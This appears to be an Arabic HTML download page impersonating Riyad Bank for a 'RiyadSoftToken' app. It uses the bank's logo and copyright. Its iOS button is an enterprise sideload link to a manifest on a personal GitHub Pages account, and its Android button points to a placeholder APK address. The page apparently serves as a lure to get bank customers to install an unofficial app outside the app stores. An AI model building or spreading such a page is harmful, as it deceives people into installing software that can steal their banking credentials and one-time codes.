<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تحميل RiyadSoftToken</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: "Tahoma", sans-serif;
      background-color: #f5f5f5;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    .header {
      background-color: #005c9c;
      padding: 20px;
    }

    .header img {
      height: 60px;
    }

    .container {
      padding: 30px;
    }

    h1 {
      color: #005c9c;
      margin-top: 20px;
    }

    p {
      font-size: 18px;
      color: #333;
      margin-bottom: 30px;
    }

    .btn-row {
      display: flex;
      justify-content: center;
      gap: 20px;
      flex-wrap: wrap;
    }

    .download-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px 25px;
      border-radius: 8px;
      font-size: 18px;
      text-decoration: none;
      color: white;
      width: 220px;
      transition: 0.3s;
    }

    .ios {
      background-color: #005c9c;
    }

    .android {
      background-color: #34a853;
    }

    .download-btn img {
      height: 24px;
      margin-left: 10px;
    }

    .footer {
      margin-top: 60px;
      color: #888;
      font-size: 14px;
    }

    @media (max-width: 500px) {
      .download-btn {
        width: 100%;
      }
    }
  </style>
</head>
<body>

  <!-- شعار بنك الرياض -->
  <div class="header">
    <img src="https://www.pif.gov.sa/-/media/project/pif-corporate/pif-corporate-site/our-investments/portfolio/pc-logos/riyad-bank-logo.png?h=271&iar=0&w=396" alt="" style="height: 60px;">

  </div>

  <div class="container">
    <h1>تحميل تطبيق RiyadSoftToken</h1>
    <p>يرجى اختيار نظام التشغيل المناسب لجهازك</p>

    <div class="btn-row">
      <!-- iOS button -->
      <a class="download-btn ios" href="itms-services://?action=download-manifest&url=https://abod1755.github.io/RB/manifest.plist">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Apple_logo_white.svg" alt="iOS">
        تحميل لـ iOS
      </a>

      <!-- Android button -->
      <a class="download-btn android" href="https://yourdomain.com/app-release.apk">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android">
        تحميل لـ Android
      </a>
    </div>

    <div class="footer">
      © بنك الرياض 2025
    </div>
  </div>

</body>
</html>
